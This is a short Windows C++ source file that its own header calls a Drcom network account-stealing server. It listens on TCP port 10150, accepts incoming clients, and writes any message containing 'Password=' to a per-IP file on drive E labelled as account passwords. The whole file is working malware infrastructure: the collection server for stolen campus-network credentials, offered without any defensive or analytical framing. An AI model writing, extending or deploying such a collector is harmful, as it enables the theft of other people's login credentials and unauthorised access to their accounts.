// Drcom网络盗号服务器.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <winsock2.h>
#include <process.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
using namespace std;
//TCP
const int PORT = 10150;

void main()
{
	/////////////////////////////////////////////////////////////////////
	//Step1:
	WSADATA wd;
	WSAStartup(0x0202, &wd);
	/////////////////////////////////////////////////////////////////////
	//Step2:
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		cout << "创建SOCKET失败，错误代码=" << WSAGetLastError() << endl;
		return;
	}
	/////////////////////////////////////////////////////////////////////
	//Step3:
	sockaddr_in sa = { AF_INET,htons(PORT) };
	int nLen = sizeof(sa);
	int nRes = bind(sock, (sockaddr*)&sa, sizeof(sa));
	if (nRes == SOCKET_ERROR) {
		cout << "bind函数失败，错误代码=" << WSAGetLastError() << endl;
		return;
	}
	while (true)
	{
		/////////////////////////////////////////////////////////////////////
		//Step4:
		cout << "服务器架设成功，端口已开启，当前状态可以接入" << endl;
		listen(sock, 5);
		SOCKET socka = accept(sock, (sockaddr*)&sa, &nLen);	//收发数据3
		if (socka == INVALID_SOCKET) {
			cout << "Accept函数错误，错误代码=" << WSAGetLastError() << endl;
			return;
		}
		//正常情况：
		cout << "客户端接入：" << inet_ntoa(sa.sin_addr) << "—" << htons(sa.sin_port) << endl;
		char sAccept[1024 * 11] = { 0 };
		char FileName[64];
		string str;
		while ((nRes = recv(socka, sAccept, sizeof(sAccept) - 1, 0)) > 0)
		{
			sAccept[nRes] = '\0';
			str = sAccept;
			if (str.find("Password=") != string::npos) {
				cout << "来自" << inet_ntoa(sa.sin_addr) << "的文件： " << endl << str.data() << endl;
				sprintf(FileName, "E:\\%s_账号密码.txt", inet_ntoa(sa.sin_addr));
				FILE *fp = fopen(FileName, "wb");
				fwrite(str.data(), 1, str.length(), fp);
				cout << "成功写入: " << FileName << endl;
				fclose(fp);
			}
			else
				cout << "来自" << inet_ntoa(sa.sin_addr) << "的消息: " << str.data() << endl;
		}
		if (WSAGetLastError() == 10054)
			cout << inet_ntoa(sa.sin_addr) << " 已断开连接！" << endl << endl;
	}
	system("pause");
}